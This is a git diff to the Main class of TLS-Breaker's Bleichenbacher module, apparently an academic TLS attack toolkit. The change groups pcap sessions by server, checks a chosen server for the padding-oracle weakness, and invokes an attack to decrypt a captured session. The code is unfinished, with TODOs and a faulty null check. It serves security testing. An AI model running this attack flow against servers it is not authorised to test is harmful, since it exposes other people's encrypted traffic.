@@ -1,11 +1,12 @@
 /**
  * TLS-Breaker - A tool collection of various attacks on TLS based on TLS-Attacker
- *
+ * <p>
  * Copyright 2021-2022 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
- *
+ * <p>
  * Licensed under Apache License, Version 2.0
  * http://www.apache.org/licenses/LICENSE-2.0.txt
  */
+
 package de.rub.nds.tlsbreaker.bleichenbacher;
 
 import com.beust.jcommander.JCommander;
@@ -25,13 +26,10 @@ import org.apache.commons.lang3.StringUtils;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
-import java.util.ArrayList;
-import java.util.List;
-import java.util.Objects;
-import java.util.Scanner;
+import java.util.*;
 
 import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
-import static de.rub.nds.tlsbreaker.bleichenbacher.impl.ConsoleInteractor.DisplaySessionInfo;
+import static de.rub.nds.tlsbreaker.bleichenbacher.impl.ConsoleInteractor.*;
 
 /**
  *
@@ -83,24 +81,80 @@ public class Main {
         List<PcapSession> sessions = pcapAnalyzer.getAllSessions();
 
         if (sessions != null || !sessions.isEmpty()) {
-            ServerSelection serverSelection = new ServerSelection();
-            String userOption = serverSelection.getValidUserSelection(sessions);
+            ServerSelection serverSelection = new ServerSelection(sessions);
+            Map<String, List<PcapSession>> serverSessionsMap = serverSelection.getServerSessionsMap();
+            List<String> uniqueServers = new ArrayList<>(serverSessionsMap.keySet());
+            displayUniqueServersFromPcap(uniqueServers, serverSessionsMap);
+            String userOption = serverSelection.getValidUserSelection(uniqueServers);
             if ("a".equals(userOption)) {
                 // List<String> servers = serverSelection.getServers(sessions);
                 checkVulnerabilityOfAllServersAndDisplay(sessions, bleichenbacherCommandConfig);
             } else {
                 // TODO: place this in else block?
-                PcapSession session = sessions.get(Integer.parseInt(userOption) - 1);
+                // PcapSession session = sessions.get(Integer.parseInt(userOption) - 1);
+                String host = uniqueServers.get(Integer.parseInt(userOption) - 1);
                 // TODO: print entire information which is displayed to user when showing server options.
-                LOGGER.info("Selected server: " + session.getDestinationHost());
-                bleichenbacherCommandConfig.getClientDelegate().setHost(session.getDestinationHost());
-                bleichenbacherCommandConfig.setEncryptedPremasterSecret(getPreMasterSecret(session));
+                LOGGER.info("Selected server: " + host);
+                bleichenbacherCommandConfig.getClientDelegate().setHost(host);
+                // bleichenbacherCommandConfig.setEncryptedPremasterSecret(getPreMasterSecret(session));
+                Boolean vulnerability = checkVulnerability(bleichenbacherCommandConfig);
+                if (Objects.equals(vulnerability, Boolean.TRUE)) {
+                    CONSOLE.info("Server " + host + " is vulnerable.");
+                    List<PcapSession> hostSessions = serverSessionsMap.get(host);
+                    displaySessionDetails(hostSessions);
+                    // TODO: Uncomment
+                    PcapSession selectedSession = getUserSelectedSession(hostSessions);
+                    if (selectedSession != null) {
+                        executeAttack(selectedSession, bleichenbacherCommandConfig);
+                    }
+                } else {
 
-                checkVulnerabilityOrExecuteAttack(bleichenbacherCommandConfig);
+                }
+
+                // checkVulnerabilityOrExecuteAttack(bleichenbacherCommandConfig);
             }
         } else {
             // TODO: throw exception
         }
+    }
+
+    private static void displaySessionDetails(List<PcapSession> hostSessions) {
+        DisplaySessionDetails(hostSessions);
+
+    }
+
+    private static Boolean checkVulnerability(BleichenbacherCommandConfig bleichenbacherCommandConfig) {
+        Attacker<? extends TLSDelegateConfig> attacker =
+                new BleichenbacherAttacker(bleichenbacherCommandConfig, bleichenbacherCommandConfig.createConfig());
+        Boolean result = null;
+        // TODO: Remove log
+        CONSOLE.info("Pcap file location = " + bleichenbacherCommandConfig.getPcapFileLocation());
+        try {
+            result = attacker.checkVulnerability();
+            if (Objects.equals(result, Boolean.TRUE)) {
+                CONSOLE.error("Vulnerable:" + result.toString());
+            } else if (Objects.equals(result, Boolean.FALSE)) {
+                CONSOLE.info("Vulnerable:" + result.toString());
+            } else {
+                CONSOLE.warn("Vulnerable: Uncertain");
+            }
+        } catch (UnsupportedOperationException e) {
+            LOGGER.info("The selected attacker is currently not implemented");
+        }
+        return result;
+    }
+
+    private static void displayUniqueServersFromPcap(List<String> uniqueServers,
+                                                     Map<String, List<PcapSession>> serverSessionsMap) {
+        CONSOLE.info("Found " + uniqueServers.size() + " servers from the pcap file.");
+        DisplayServerDetails(uniqueServers, serverSessionsMap);
+        /*
+         * for (int i = 0; i < serverList.size(); i++) { CONSOLE.info(i + 1 + ") " + serverList.get(i)); }
+         */
+        // CONSOLE.info("a) Check if all the above servers are vulnerable.");
+        CONSOLE.info("Please select a server number to check for vulnerability "
+                             + "or press 'a' to check for vulnerability of all the servers.");
+        CONSOLE.info("Select Option: ");
     }
 
     private static void checkVulnerabilityOfAllServersAndDisplay(List<PcapSession> sessions,
@@ -185,7 +239,8 @@ public class Main {
     private static void displayVulnerableServers(List<PcapSession> sessions) {
 
         CONSOLE.info("Found " + sessions.size() + " server that are vulnerable.");
-        DisplaySessionInfo(sessions);
+        // TODO: Uncomment DisplayServerDetails
+        //DisplayServerDetails(sessions);
         /*
          * for (int i = 0; i < vulnerableServers.size(); i++) { CONSOLE.info(i + 1 + ") " + vulnerableServers.get(i)); }
          */
